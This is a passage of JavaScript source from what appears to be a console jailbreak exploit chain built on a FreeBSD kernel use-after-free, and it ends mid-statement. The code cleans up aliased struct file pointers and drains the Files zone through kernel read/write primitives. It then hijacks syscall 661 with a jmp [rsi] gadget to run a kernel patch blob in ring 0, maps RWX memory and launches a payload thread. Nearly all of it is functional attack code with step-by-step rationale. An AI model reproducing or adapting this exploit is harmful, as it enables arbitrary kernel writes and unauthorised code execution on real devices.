                        int64.js gives each instance its own seven closures
                        (int64.js:19-93), so 8 GC cells apiece -- plus a
                        per-call Uint8Array inside kv.read8, plus two pipe
                        syscalls. 34,816 objects and 4,096 syscalls in one
                        unbroken synchronous stretch, at the point the heap is
                        most loaded, with no yield anywhere in it. JSC's
                        sweeper only runs when the event loop turns, so all of
                        that garbage sat unswept until the await immediately
                        after SOCKETS-CLOSED -- which is exactly where the
                        process was being killed.

                        Same range, same comparisons, same writes. The ofiles
                        array is just read in bulk and scanned as raw words in
                        the DataView: no int64, no typed array, no per-fd
                        syscall. Two syscalls per 512 fds instead of 1024.
                        Cleanup runs ~500 ms after the race, so the yields are
                        free here.
                        BOUNDED. This scan used to run to 0x800 with nothing
                        proving the ofiles array is that big. If the table is
                        smaller, the bulk read walks past the allocation and
                        any 8 bytes out there that happen to equal uafFp get
                        ZEROED by the fput below -- an out-of-bounds kernel
                        write whose damage surfaces at the NEXT allocation,
                        which is exactly the window where 22% of the runs
                        reaching here died. POOPS.LUA:1219 scans only 0..255;
                        we were eight times wider with no bound at all.

                        Bound it by the highest fd we can PROVE is open,
                        because we are holding it -- the table must have at
                        least that many entries, and FreeBSD never shrinks it
                        on close. No fd_nfiles offset to get wrong. The
                        highest alias ever observed across 71 logged runs is
                        273, and our own sockets run past that.
                        */
                        let maxHeld = 0;
                        for (const fd of ipv6) if (fd > maxHeld) maxHeld = fd;
                        for (const fd of [masterPipe[0], masterPipe[1],
                        slavePipe[0], slavePipe[1],
                        iovSs[0], iovSs[1], uioSs[0], uioSs[1],
                            uafSock])
                            if (fd > maxHeld) maxHeld = fd;
                        const SCAN_MAX = Math.min(0x800, maxHeld + 1);
                        mark("UAF-SCAN-BOUND", "max_held_fd=" + maxHeld
                            + " scan_max=" + SCAN_MAX + " was=2048");

                        /*
                        CLAMPED, and it has to be. This value is the loop
                        INCREMENT at the bottom of this block, not a bound, so
                        unlike every other knob in this file a bad value does
                        not degrade to "do nothing" -- it never terminates.
                        parseInt("0x200", 10) is 0 (it stops at the x), and
                        0x200 is exactly how the default is spelled right
                        here, so that is the value someone is most likely to
                        paste in. A non-terminating loop here awaits a 0 ms
                        timer forever: the finally never runs, the main thread
                        stays realtime-pinned, the freed file stays aliased,
                        and the console needs a hard power-off.
                        Upper bound: CHUNK_BYTES must stay strictly under
                        PIPE_PAGE, or pipe_read wraps its buffer and hands
                        back DUPLICATED data that still passes the
                        rv === CHUNK_BYTES check -- which would make fput()
                        write zeros far past the end of the fd table.
                        */
                        const CHUNK_FDS = (function () {
                            const cap = (PIPE_PAGE / FILEDESCENT_SIZE) >> 1;
                            const n = params.has("scanchunk")
                                ? parseInt(params.get("scanchunk"), 10) : 0x200;
                            if ((n | 0) === n && n >= 1 && n <= cap) return n;
                            if (params.has("scanchunk"))
                                mark("SCANCHUNK-CLAMPED", "given="
                                    + params.get("scanchunk") + " cap=" + cap
                                    + " using=0x200");
                            return 0x200;
                        })();
                        const CHUNK_BYTES = CHUNK_FDS * FILEDESCENT_SIZE;
                        const scanAb = new ArrayBuffer(CHUNK_BYTES);
                        keepAlive.push(scanAb);   // its address goes to the kernel
                        const scanAddr = bufAddr(scanAb);
                        const scanDv = new DataView(scanAb);
                        const wantLo = uafFp.low >>> 0, wantHi = uafFp.hi >>> 0;
                        let nulled = 0, bulkChunks = 0, slowChunks = 0;
                        const fds = [];
                        for (let base = 0; base < SCAN_MAX; base += CHUNK_FDS) {

                            /*
                            Clamp the LAST chunk. SCAN_MAX is now a measured
                            bound, not a round number, so a fixed-size read
                            here would walk past the table on the final chunk
                            -- reintroducing the exact out-of-bounds this
                            bound exists to prevent.
                            */
                            const nFds = Math.min(CHUNK_FDS, SCAN_MAX - base);
                            const nBytes = nFds * FILEDESCENT_SIZE;
                            const rv = kv.kread(scanAddr,
                                fdtOfiles.add32(base * FILEDESCENT_SIZE),
                                nBytes);
                            if (rv === nBytes) {
                                bulkChunks++;
                                for (let i = 0; i < nFds; ++i) {
                                    const o = i * FILEDESCENT_SIZE;
                                    if (scanDv.getUint32(o, true) === wantLo
                                        && scanDv.getUint32(o + 4, true) === wantHi) {
                                        const fd = base + i;
                                        fput(fd, new int64(0, 0));
                                        nulled++; fds.push(fd);
                                    }
                                }
                            } else {

                                /*
                                Short read: redo THIS CHUNK the original way.
                                Never skip one -- a missed alias leaves the
                                console dirty and costs a reboot, which is far
                                worse than the allocation we are avoiding.
                                */
                                slowChunks++;
                                for (let i = 0; i < nFds; ++i) {
                                    const fd = base + i;
                                    if (same(fget(fd), uafFp)) {
                                        fput(fd, new int64(0, 0));
                                        nulled++; fds.push(fd);
                                    }
                                }
                            }

                            // Let the sweeper run. This is the whole point.
                            await new Promise(done => setTimeout(done, 0));
                        }
                        mark("UAF-SCAN", "chunks=" + CHUNK_FDS + "fd bulk="
                            + bulkChunks + " fellback=" + slowChunks
                            + " syscalls=" + (bulkChunks * 2 + slowChunks * CHUNK_FDS * 2));
                        uafSock = 0;

                        /*
                        P1: DRAIN THE FILE ZONE
                        MEASURED, not assumed. A 256-allocation probe returned
                        the SAME struct file at three consecutive fds
                        (364,365,366): the chunk is linked into the Files zone
                        free list THREE times -- freed 3x (CLEAR_QUEUE and two
                        dup+close) but allocated once -- so falloc hands the
                        identical object to three independent owners. The first
                        to close it frees it; the other two dangle. That is the
                        panic minutes after an idle run.

                        The fd-table scan above cannot see this: a free-list
                        entry is in no fd table. Pull the duplicates out by
                        allocating until they surface (~1032 deep, stride 0x68).

                        NULL the slot; do NOT leak the fd. f_count reads 1, not
                        3 -- each falloc resets it -- so three descriptors point
                        at an object whose refcount says one, and leaking them
                        only moves the panic to fdescfree at process exit.
                        Nulling means nothing references it and it is orphaned
                        for good. netctrl_c0w_twins.ts:1332 nulls before close
                        for exactly this reason.
                        */
                        const DRAIN_CAP = (function () {
                            const n = params.has("drain")
                                ? parseInt(params.get("drain"), 10) : 1536;
                            return ((n | 0) === n && n >= 0 && n <= 8192) ? n : 1536;
                        })();
                        const DRAIN_EXPECT = 3, DRAIN_BATCH = 128;

                        /*
                        Visible to the `clean` decision below. Default true so
                        that ?drain=0 does not by itself condemn the run.
                        */
                        let zoneClean = true;
                        if (DRAIN_CAP > 0) {
                            const dAb = new ArrayBuffer(DRAIN_BATCH * FILEDESCENT_SIZE);
                            keepAlive.push(dAb);
                            const dAddr = bufAddr(dAb), dDv = new DataView(dAb);
                            const oneAb = new ArrayBuffer(8); keepAlive.push(oneAb);
                            const oneAddr = bufAddr(oneAb), oneDv = new DataView(oneAb);
                            const wLo = uafFp.low >>> 0, wHi = uafFp.hi >>> 0;
                            const held = [], hitFds = [];
                            let scanned = 0, batches = 0, moved = 0, emfile = false;

                            /*
                            The fd table REALLOCATES as it grows, so the cached
                            fdtOfiles goes stale mid-drain and both fget and fput
                            would then touch freed memory. Re-read it each batch
                            and use the fresh pointer for reads AND writes.
                            */
                            let ofl = fdtOfiles;
                            const dl = Date.now() + 15000;
                            while (scanned < DRAIN_CAP && hitFds.length < DRAIN_EXPECT
                                && Date.now() < dl) {
                                const batch = [];
                                for (let i = 0; i < DRAIN_BATCH && scanned < DRAIN_CAP; ++i) {
                                    const fd = sc(SYS.socket, AF_UNIX, SOCK_STREAM, 0).i32;
                                    if (fd === -1) { emfile = true; break; }
                                    batch.push(fd); held.push(fd); scanned++;
                                }
                                if (!batch.length) break;
                                batches++;
                                const fresh = kv.read8(kqFdp);
                                if (kptr2(fresh) && !(fresh.low === ofl.low
                                    && fresh.hi === ofl.hi)) {
                                    ofl = fresh; moved++;
                                }
                                const lo = batch[0], hi = batch[batch.length - 1];
                                const span = (hi - lo + 1) * FILEDESCENT_SIZE;
                                let bulk = false;
                                if (span > 0 && span <= dAb.byteLength) {
                                    bulk = kv.kread(dAddr,
                                        ofl.add32(lo * FILEDESCENT_SIZE), span) === span;
                                }
                                for (const fd of batch) {
                                    let flo, fhi;
                                    if (bulk) {
                                        const o = (fd - lo) * FILEDESCENT_SIZE;
                                        flo = dDv.getUint32(o, true) >>> 0;
                                        fhi = dDv.getUint32(o + 4, true) >>> 0;
                                    } else {
                                        if (kv.kread(oneAddr,
                                            ofl.add32(fd * FILEDESCENT_SIZE), 8) !== 8)
                                            continue;
                                        flo = oneDv.getUint32(0, true) >>> 0;
                                        fhi = oneDv.getUint32(4, true) >>> 0;
                                    }
                                    if (flo === wLo && fhi === wHi) hitFds.push(fd);
                                }
                                await new Promise(done => setTimeout(done, 0));
                            }

                            /*
                            NULL every hit through the CURRENT ofiles, then close.
                            close() on a nulled slot is a no-op, so nothing frees.
                            */
                            let nulledHits = 0;
                            for (const fd of hitFds) {
                                oneDv.setUint32(0, 0, true); oneDv.setUint32(4, 0, true);
                                kv.kwrite(ofl.add32(fd * FILEDESCENT_SIZE), oneAddr, 8);
                                if (kv.kread(oneAddr,
                                    ofl.add32(fd * FILEDESCENT_SIZE), 8) === 8
                                    && oneDv.getUint32(0, true) === 0
                                    && oneDv.getUint32(4, true) === 0) nulledHits++;
                                sc(SYS.close, fd);
                            }
                            for (const fd of held)
                                if (hitFds.indexOf(fd) < 0) sc(SYS.close, fd);
                            mark("ZONE-DRAIN", "scanned=" + scanned + "/" + DRAIN_CAP
                                + " batches=" + batches
                                + " hits=" + hitFds.length + "/" + DRAIN_EXPECT
                                + (hitFds.length ? " at_fds=" + hitFds.join(",") : "")
                                + " nulled=" + nulledHits
                                + " ofiles_moved=" + moved
                                + (emfile ? " EMFILE" : ""));
                            /*
                            FALSE-REBOOT FIX. DRAIN_EXPECT is a guess about a
                            COUNT ("the Files zone free list holds three copies").
                            It is not authoritative: the number that surface
                            depends on zone layout and can legitimately be 0, 2
                            or 4. When it disagreed we set zoneClean=false and
                            rebootRequired=true -- and because the drain is the
                            only place zoneClean is cleared, a run with a
                            perfectly healthy kernel was condemned to "REBOOT"
                            and success=false even with jailbreak + payload OK.

                            The AUTHORITATIVE test is the one below it:
                            ZONE-VERIFY / freed-file-not-reissued-by-falloc,
                            i.e. vhits === 0 -- fresh allocations no longer get
                            handed the chunk. That is a direct measurement of
                            the thing we actually care about.

                            So: the count mismatch is reported, not fatal. What
                            stays fatal is a NULL-WRITE that did not take
                            (nulledHits < hitFds.length), because that leaves a
                            live descriptor on a freed object.
                            */
                            check("file-zone-duplicates-drained",
                                hitFds.length >= 1
                                && nulledHits === hitFds.length,
                                "found " + hitFds.length + " of ~" + DRAIN_EXPECT
                                + ", nulled " + nulledHits);
                            if (hitFds.length === 0)
                                mark("ZONE-DRAIN-NOHITS", "no duplicates surfaced"
                                    + " (count is layout-dependent, not a fault)");
                            if (nulledHits !== hitFds.length) {
                                rebootRequired = true; zoneClean = false;
                            }

                            /*
                            Independent verification: fresh allocations must no
                            longer be handed the chunk. This is the measurement
                            that says the console is actually clean.
                            */
                            const vfds = [];
                            let vhits = 0;
                            for (let i = 0; i < 16; ++i) {
                                const fd = sc(SYS.socket, AF_UNIX, SOCK_STREAM, 0).i32;
                                if (fd === -1) break;
                                vfds.push(fd);
                            }
                            const vres = kv.read8(kqFdp);
                            const vofl = kptr2(vres) ? vres : ofl;
                            for (const fd of vfds) {
                                if (kv.kread(oneAddr,
                                    vofl.add32(fd * FILEDESCENT_SIZE), 8) !== 8) {
                                    sc(SYS.close, fd); continue;
                                }
                                if ((oneDv.getUint32(0, true) >>> 0) === wLo
                                    && (oneDv.getUint32(4, true) >>> 0) === wHi) {
                                    vhits++;
                                    oneDv.setUint32(0, 0, true);
                                    oneDv.setUint32(4, 0, true);
                                    kv.kwrite(vofl.add32(fd * FILEDESCENT_SIZE),
                                        oneAddr, 8);
                                }
                                sc(SYS.close, fd);
                            }
                            mark("ZONE-VERIFY", "alloc=" + vfds.length
                                + " residual_hits=" + vhits);
                            check("freed-file-not-reissued-by-falloc", vhits === 0,
                                vhits ? "still reissued after the drain" : "");
                            if (vhits) { rebootRequired = true; zoneClean = false; }
                        }


                        //END P1: DRAIN THE FILE ZONE
                        mark("UAF-REMOVED", "fhold=" + r.before + "->" + r.after
                            + " nulled=" + nulled + "/" + SCAN_MAX
                            + " fds=" + fds.join(","));

                        /*
                        `nulled > 0` only ever proved the LIVE FD TABLE was
                        tidy. It is structurally blind to a free-list entry,
                        and every "clean" run we celebrated was reporting on
                        that blind evidence -- which is why the console kept
                        panicking minutes later. A run is clean only if the fd
                        table was repaired AND the zone drain removed every
                        duplicate AND fresh allocations no longer see it.
                        */
                        check("alias-freed-file-nulled",
                            nulled > 0, "nulled=" + nulled);
                        /*
                        zoneClean now means "no un-repaired duplicate was left"
                        (see the drain block) -- NOT "we found exactly three".
                        fdtable + zone both healthy is the one path that clears
                        rebootRequired.
                        */
                        const clean = nulled > 0 && zoneClean;
                        if (clean) rebootRequired = false;
                        else mark("STILL-DIRTY", "reboot=1 fdtable="
                            + (nulled > 0 ? "ok" : "FAILED")
                            + " zone=" + (zoneClean ? "ok" : "FAILED"));
                    } else {
                        check("uaf_sock-struct-file-readable", false,
                            "fp=" + uafFp);
                    }

                    {
                        let closed = 0, heldBack = 0;
                        for (const fd of ipv6) {

                            /*
                            ITEM 6(c). A still-burned socket owns an rthdr over
                            freed memory; close() would free it a second time.
                            Leaking the fd costs nothing, freeing it panics.
                            */
                            if (burned.has(fd)) { heldBack++; continue; }
                            if (sc(SYS.close, fd).i32 === 0) closed++;
                        }
                        for (const fd of [iovSs[0], iovSs[1], uioSs[0], uioSs[1]])
                            if (sc(SYS.close, fd).i32 === 0) closed++;
                        /*
                        kqFd is closed HERE now, not at the end of the leak.

                        It must stay open through the whole kread/kwrite path:
                        the kqueue reclaimed the freed chunk, and closing it
                        returns that chunk to the UMA zone, which makes
                        triplets[0]'s rthdr dangle. See the note at
                        stageLeakKqueue. By this point kernel R/W is up and the
                        aliases have been repaired, so releasing it is safe --
                        and it must be released, or it leaks for the process's
                        life.
                        */
                        if (kqFd >= 0) {
                            if (sc(SYS.close, kqFd).i32 === 0) closed++;
                            mark("KQF-CLOSED-AT-CLEANUP", "fd=" + kqFd);
                            kqFd = -1;
                        }
                        mark("SOCKETS-CLOSED", "n=" + closed + "/" + (ipv6.length + 5)
                            + (heldBack ? "  held_back_burned=" + heldBack : ""));
                    }

                    await restoreThreadAttrs("cleanup");


                    let kpatched = false;
                    if (jailbroken && kpatch && KPATCH_JMP_SITES.length >= 4) {
                        state("kernel patches...", "warn");
                        const sysent = kernelBase.add32(off.k_sysent_661);
                        const gadget = kernelBase.add32(off.k_jmp_rsi);
                        const gb = [];
                        for (let i = 0; i < 4; ++i)
                            gb.push(readByte(io, gadget.add32(i)));
                        mark("JMP-RSI-BYTES", gadget + " -> "
                            + gb.map(v => v.toString(16).padStart(2, "0")).join(" "));

                        const gadgetOk = gb[0] === 0xff && gb[1] === 0x26;
                        const saved = readSysentEntry(sysent, io);
                        const oNarg = saved.narg, oCall = saved.call;
                        const oThr = saved.thrcnt;
                        mark("SYSENT-661", "narg=" + oNarg + " thrcnt=" + oThr
                            + " sy_call=" + oCall);
                        const sysentOk = oNarg >= 0 && oNarg <= 8 && kptr2(oCall);

                        const siteBytes = [];
                        let sitesOk = true;
                        for (const s of KPATCH_JMP_SITES) {
                            const b = readByte(io, kernelBase.add32(s));
                            siteBytes.push(hx(s) + ":" + b.toString(16));
                            if (!isGateableJumpByte(b)) sitesOk = false;
                        }
                        mark("KPATCH-SITES", siteBytes.join(" "));
                        check("gadget-sysent661-patch-sites-look-right",
                            gadgetOk && sysentOk && sitesOk,
                            "gadget=" + gadgetOk + " sysent=" + sysentOk
                            + " sites=" + sitesOk);
                        if (gadgetOk && sysentOk && sitesOk) {
                            /*
                            Netctrl's own policy: a FIXED 0x4000 RWX region.
                            lapse page-rounds the blob length instead; if a
                            kpatch blob ever exceeds 0x4000 bytes netctrl is
                            the one that is wrong, so the size is left here
                            where it is visible rather than moved into the
                            shared helper.
                            */
                            const KEXEC_MAP = new int64(KEXEC_MAP_LO, KEXEC_MAP_HI);
                            const m = mapRwxAtFixedAddress(sc, SYS, 0x4000, KEXEC_MAP);
                            const jitFd = m.fd;
                            const mapAddr = new int64(m.lo, m.hi);
                            mark("KPATCH-MAP", "jitshm_create=" + jitFd
                                + " mmap=" + mapAddr);
                            if (mapAddr.hi > 0) {
                                /* Copy + verify = 2 x kpatch.length sync writes. */
                                const blob = await copyBlobToKernel(p, int64, mapAddr, kpatch);
                                const copied = blob.copied;
                                check("blob-rwx-memory-byte-byte",
                                    copied, kpatch.length + " bytes");
                                if (copied) {
                                    armSysentEntry(sysent, io, gadget);
                                    const armedOk = same(readSysentEntry(sysent, io).call, gadget);
                                    mark("SYSENT-ARMED", "sy_call=" + gadget
                                        + (armedOk ? "" : " MISMATCH"));
                                    if (armedOk) {

                                        /*
                                        ITEM 5b. sysent[661] is now pointing at
                                        a jmp [rsi] gadget SYSTEM-WIDE. If
                                        anything between here and the restore
                                        throws, every process on the console is
                                        left with a weaponised syscall 661 --
                                        and the outer finally does not cover
                                        this, because it is nested inside the
                                        KernelView block. Restore in a finally.
                                        */
                                        let rc = -1;
                                        try {
                                            rc = sc(SYS.kexec, mapAddr).i32;
                                        } finally {
                                            writeSysentEntry(sysent, io, saved);
                                            const back = same(
                                                readSysentEntry(sysent, io).call, oCall);
                                            if (!back) mark("SYSENT-NOT-RESTORED",
                                                "sy_call still " +
                                                readSysentEntry(sysent, io).call
                                                + " -- syscall 661 is armed system-wide");
                                        }
                                        const verify = [];
                                        let allEb = true;
                                        for (const s of KPATCH_JMP_SITES) {
                                            const b = readByte(io, kernelBase.add32(s));
                                            verify.push(hx(s) + ":" + b.toString(16));
                                            if (b !== 0xeb) allEb = false;
                                        }
                                        mark("KEXEC", "arg=" + mapAddr + " rc=" + rc
                                            + " sysent=restored");
                                        mark("KPATCH-VERIFY", verify.join(" "));
                                        kpatched = rc === 0 && allEb;
                                        check("gated-site-reads-0xeb",
                                            allEb, "");
                                        check("blob-ran-ring-0", rc === 0,
                                            "kexec=" + rc);
                                        if (kpatched) mark("KERNEL-PATCHED",
                                            "sites=" + KPATCH_JMP_SITES.length);
                                    }
                                }
                            }
                        }
                    } else if (jailbroken) {
                        mark("KPATCH-SKIPPED", "blob=" + (kpatch ? kpatch.length : 0)
                            + " sites=" + KPATCH_JMP_SITES.length);
                    }

                    function resolvePthreadCreate() {
                        /*
                        Shared resolver (post-exploit.js op 1). It does the
                        three byte heuristics and the authoritative offsets-
                        table cross-check, and returns { target, how, cand }.

                        Two things it deliberately leaves to THIS caller, so
                        netctrl's behaviour and proof counts are unchanged:
                          - it calls no check() (netctrl checks at its own
                            call site: pthread-create-resolved);
                          - it does not apply ?forcepthread=1 -- the force
                            step below needs `cand`, and netctrl marks
                            PTHREAD-FORCED regardless of the resolver's result.
                        */
                        const rr = resolvePthreadCreateShared({
                            p: p, webkitBase: webkitBase,
                            libkernelBase: libkernelBase, offsets: off, mark: mark,
                        });
                        /*
                        Order matters here and matches the original: the
                        ?forcepthread=1 override runs BEFORE PTHREAD-TARGET is
                        marked, so a forced run logs "forced -> <addr>" rather
                        than "not resolved". Marking first would leave the
                        diagnostic claiming no target while we call one anyway.
                        */
                        let target = rr.target, how = rr.how;
                        if (!target && params.get("forcepthread") === "1") {
                            target = rr.cand;
                            how = "forced";
                            mark("PTHREAD-FORCED", "?forcepthread=1 -- calling "
                                + rr.cand + " anyway");
                        }
                        mark("PTHREAD-TARGET", target
                            ? how + " -> " + target : "not resolved");
                        return target;
                    }

                    let payloadRunning = false;
                    if (payload && (kpatched || params.get("payload") === "1")
                        && params.get("payload") !== "0") {
                        state("payload...", "warn");
                        const sz = (payload.length + 0x3fff) & ~0x3fff;
                        /* Shared anonymous RWX map (post-exploit.js op 3). */
                        const am = mapAnonymousRwx(sc, SYS, sz, int64);
                        const entry = am.entry;
                        mark("PAYLOAD-MAP", "size=0x" + sz.toString(16)
                            + " rwx=" + entry);
                        if (entry.hi > 0) {
                            /* Copy + verify via the shared write8 blob path. */
                            const blob = await copyBlobToKernel(p, int64, entry, payload);
                            const bad = blob.copied ? -1 : 0;
                            check("byte-payload-rwx-memory",
                                bad < 0, bad < 0 ? "" : "mismatch at +" + hx(bad));
                            if (bad < 0) {
                                const target = resolvePthreadCreate();
                                check("pthread-create-resolved", !!target,
                                    target ? "target=" + target : "no validated target");
                                if (!target)
                                    mark("PAYLOAD-MAPPED-NOT-LAUNCHED",
                                        "payload mapped and verified at " + entry
                                        + " but pthread_create was not resolved -- "
                                        + "read PTHREAD-BYTES above; "
                                        + "?forcepthread=1 to override");
                                if (target) {
                                    /* Shared pthread_create launch (op 3). */
                                    const alloc = n => {
                                        const ab = new ArrayBuffer(n);
                                        keepAlive.push(ab);
                                        return { addr: bufAddr(ab),
                                            dv: new DataView(ab),
                                            u8: new Uint8Array(ab) };
                                    };
                                    const lt = launchThread(
                                        (t, ...a) => callAddr(t, a),
                                        alloc, int64, target, entry);
                                    const rc = lt.rc, handle = lt.handle;
                                    payloadRunning = lt.launched;
                                    payloadRan = payloadRunning;
                                    mark("PTHREAD-CREATE", "rc=" + rc
                                        + " handle=" + handle);
                                    check("payload-thread-created",
                                        payloadRunning, "");
                                    if (payloadRunning) mark("PAYLOAD-RUNNING",
                                        "bytes=" + payload.length + " entry=" + entry);
                                }
                            }
                        }
                    }

                    /*
                    END-OF-RUN STATE DUMP.
                    READ ONLY. Not a fix -- a measurement. Everything above has
                    finished, so this reports what we ACTUALLY leave behind
                    rather than what the source implies we leave behind. Three
                    confident inferences from reading code have already been
                    wrong; this replaces the fourth with data.
                    ?dump=0 to skip.
                    */

                    if (params.get("dump") !== "0") {
                        try {
                            const kq = v => v && (v.hi >>> 0) >= 0xffff0000;
                            const rd8 = a => kq(a) ? kv.read8(a) : null;
                            const rd32 = function (a) {
                                if (!kq(a)) return null;
                                dmpU8.fill(0);
                                if (kv.kread(dmpAddr, a, 4) !== 4) return null;
                                return dmpDv.getInt32(0, true);
                            };

                            /*
                            The 4 karw pipe files, and the forged pipebuf.
                            fd 15 reads f_count 2 BEFORE we touch it on every
                            run while its siblings read 1. Nobody has explained
                            that. This prints the final state of all four.
                            */
                            const pf = [];
                            for (const fd of [masterPipe[0], masterPipe[1],
                            slavePipe[0], slavePipe[1]]) {
                                const fp = fget(fd);
                                pf.push(fd + ":" + (kq(fp) ? "fc=" + rd32(fp.add32(0x28))
                                    : "nofp"));
                            }
                            mark("DUMP-PIPE-FCOUNT", pf.join(" "));

                            for (const [nm, fd] of [["master", masterPipe[0]],
                            ["slave", slavePipe[0]]]) {
                                const fp = fget(fd);
                                const fdata = rd8(fp);
                                if (!kq(fdata)) { mark("DUMP-PIPEBUF", nm + " nofdata"); continue; }
                                dmpU8.fill(0);
                                const okr = kv.kread(dmpAddr, fdata, 0x18) === 0x18;
                                mark("DUMP-PIPEBUF", nm + " @" + fdata
                                    + (okr ? "  cnt=" + dmpDv.getUint32(0, true)
                                        + " in=" + dmpDv.getUint32(4, true)
                                        + " out=" + dmpDv.getUint32(8, true)
                                        + " size=0x" + dmpDv.getUint32(0xc, true).toString(16)
                                        + " buffer=" + new int64(dmpDv.getUint32(0x10, true),
                                            dmpDv.getUint32(0x14, true))
                                        : "  READ-FAILED"));
                            }

                            /*
                            The triplets' outputopts, re-read after close.
                            Confirms the repair actually persisted rather than
                            being undone by the socket teardown.
                            */
                            const to = [];
                            for (const e of dumpOpts) {
                                const r = rd8(e.opts.add32(0x68));
                                const pi = rd8(e.opts.add32(0x10));
                                to.push("fd" + e.fd + "@" + e.opts
                                    + " rthdr=" + (r || "?")
                                    + " pktinfo=" + (pi || "?"));
                            }
                            mark("DUMP-TRIPLET-OPTS", to.length ? to.join("  ") : "none");

                            // the triple-freed struct file ---
                            const uf = (typeof uafFpSaved !== "undefined") ? uafFpSaved : null;
                            if (kq(uf)) {
                                mark("DUMP-UAF-FILE", "fp=" + uf
                                    + " f_count=" + rd32(uf.add32(0x28))
                                    + " f_data=" + (rd8(uf) || "?"));
                            }

                            // ANY fd-table slot still pointing at it
                            if (kq(uf) && kq(fdtOfiles)) {
                                let hits = 0, lastFd = -1;
                                const wl = uf.low >>> 0, wh = uf.hi >>> 0;
                                const nfd = Math.min(0x400, (typeof SCAN_MAX !== "undefined")
                                    ? SCAN_MAX + 0x40 : 0x400);
                                for (let base = 0; base < nfd; base += 0x80) {
                                    const n = Math.min(0x80, nfd - base);
                                    if (kv.kread(scanAddrDump,
                                        fdtOfiles.add32(base * FILEDESCENT_SIZE),
                                        n * FILEDESCENT_SIZE) !== n * FILEDESCENT_SIZE) break;
                                    for (let i = 0; i < n; ++i) {
                                        const o = i * FILEDESCENT_SIZE;
                                        if (scanDvDump.getUint32(o, true) === wl
                                            && scanDvDump.getUint32(o + 4, true) === wh) {
                                            hits++; lastFd = base + i;
                                        }
                                    }
                                }
                                mark("DUMP-UAF-REFS", "slots_still_pointing_at_it=" + hits
                                    + (hits ? " last_fd=" + lastFd : "")
                                    + "  scanned=" + nfd);
                            }


                            // our own process
                            if (kq(curproc)) {
                                const uc = rd8(curproc.add32(0x40));
                                const pfd = rd8(curproc.add32(0x48));
                                mark("DUMP-PROC", "curproc=" + curproc
                                    + " ucred=" + (uc || "?")
                                    + (kq(uc) ? " cr_ref=" + rd32(uc.add32(0x00))
                                        + " uid=" + rd32(uc.add32(0x04))
                                        + " prison=" + (rd8(uc.add32(0x30)) || "?") : "")
                                    + " p_fd=" + (pfd || "?"));
                                if (kq(pfd))
                                    mark("DUMP-FILEDESC", "fd_cdir=" + (rd8(pfd.add32(0x10)) || "?")
                                        + " fd_rdir=" + (rd8(pfd.add32(0x18)) || "?")
                                        + " fd_jdir=" + (rd8(pfd.add32(0x20)) || "?"));
                            }

                            mark("DUMP-DONE", "read-only, no kernel writes");
                        } catch (e) {
                            mark("DUMP-THREW", (e && e.message) ? e.message : String(e));
                        }
                    }


                    // END END-OF-RUN STATE DUMP
                    mark("STEP10-CHAIN", "kv=up jailbroken=" + jailbroken
                        + " kpatched=" + kpatched + " payload=" + payloadRunning
                        + " cleanup=" + (rebootRequired ? "incomplete" : "complete"));
                    /*
                    THE EXPLOIT SUCCEED IF THE PAYLOAD IS RUNNING. Period.
                    This used to be `payloadRunning && !rebootRequired`, which
                    meant a run that jailbroke the console, patched the kernel
                    and launched the payload still reported success=false -- and
                    main.js then showed "Partial success" and popped "Reboot the
                    console and try again" -- purely because cleanup bookkeeping
                    wanted a reboot.

                    rebootRequired is a HYGIENE verdict ("this kernel is dirty,
                    reboot when convenient"). It is reported to the caller as its
                    own field and must not masquerade as failure. A running
                    payload is the definition of done.
                    */
                    allDone = payloadRunning;
                    payloadRan = payloadRunning;
                    if (payloadRunning && rebootRequired)
                        mark("DIRTY-BUT-DONE", "payload is running anyway;"
                            + " rebootRecommended=1 (cleanup incomplete)");
                }
            }
        }
        return !!kv;
}

/*
STAGE 9: stageReport -- the summary, the failure ladder, the status bar
Runs from the orchestrator's finally, on EVERY exit path, after stageTeardown.
The wording is the file's own: a running payload is a SUCCESS and leads, a reboot
is a recommendation rather than a red failure when the exploit itself worked.
*/
function stageReport() {
        mark("STEP10-SUMMARY", "committed=" + committed
            + " reboot=" + rebootRequired
            + " triplets=" + (triplets ? triplets.join(",") : "none")
            + " kernel_base=" + (kernelBase || "none")
            + " kq_fdp=" + (kqFdp || "none")
            + " kv=" + (kv ? "up" : "down"));

        if (!kv) {
            const stage = !committed ? "not-armed"
                : !triplets ? "triple-free"
                    : !kernelBase ? "leak-kqueue"
                        : "make-karw";
            mark("FAILED-STAGE", "stage=" + stage
                + " reached=" + (triplets ? "triplets" : committed ? "commit" : "none"));
        }

        /*
        Status bar. A running payload is a SUCCESS, so allDone (payload) leads.
        Only a payload that is NOT running falls through to the failure
        ladder. And a reboot is a recommendation, not a red failure, when the
        exploit itself worked -- hence the separate DIRTY-BUT-DONE wording.
        */
        state(payloadRan
            ? (rebootRequired ? "JAILBROKEN -- REBOOT RECOMMENDED"
                : "ALL DONE")
            : kv ? "KERNEL R/W -- REBOOT NEEDED"
                : kernelBase ? "FAILED IN make_karw -- REBOOT"
                    : triplets ? "FAILED IN leak_kqueue (triple free was OK) -- REBOOT"
                        : committed ? "FAILED IN triple free -- REBOOT"
                            : "no commit",
            payloadRan ? (rebootRequired ? "warn" : "ok")
                : kv ? "warn" : "bad");
}

/*
STAGE 10: stageTeardown -- restore the page, whatever happened

The old `finally`. Disarm every worker's expm1 gate, put each master vector back,
terminate the workers, restore MAIN's expm1, then report. Runs on every exit path
-- leaving the page pinned at RT priority with armed gates is what poisons the
NEXT run's primitive groom.
*/
async function stageTeardown() {
        if (uafSock) mark("UAF-SOCK-LEFT-OPEN", "fd=" + uafSock);

        try {
            if (restoreCtx) await restoreCtx.restore("finally");
        } catch (e) { mark("THREAD-ATTRS-RESTORE-THREW", e.message); }
        /*
        SAME STALL AS THE cleanup PASS (see restoreThreadAttrs). 16 workers x a
        5000 ms RPC timeout, and only a failure mark, so a run where every
        worker ROP context is spent sat here silently for up to 80 s. This is
        the very last thing before the page reports, so it is the worst place
        to go quiet.

        Shorter timeout (best-effort: main is already restored and the workers
        are about to be terminated anyway) plus a mark per worker.
        */
        const DISARM_MS = params.has("disarmms")
            ? parseInt(params.get("disarmms"), 10) : 1000;
        let disarmed = 0, disarmFailed = 0;
        const disarmErrs = [];
        for (const w of workers) {
            try {
                if (!w.armed) continue;
                await w.rpc("disarm", DISARM_MS);
                w.armed = false;
                disarmed++;
            } catch (e) {
                disarmFailed++;
                disarmErrs.push(w.name + ": "
                    + ((e && e.message) ? e.message : String(e)));
            }
        }
        /*
        One line for the whole pool -- N identical "ok" marks per run told us
        nothing the tally does not. Kept at mark() level: a disarm that fails
        en masse is what poisons the NEXT run's groom, so the count matters.
        */
        if (workers.length)
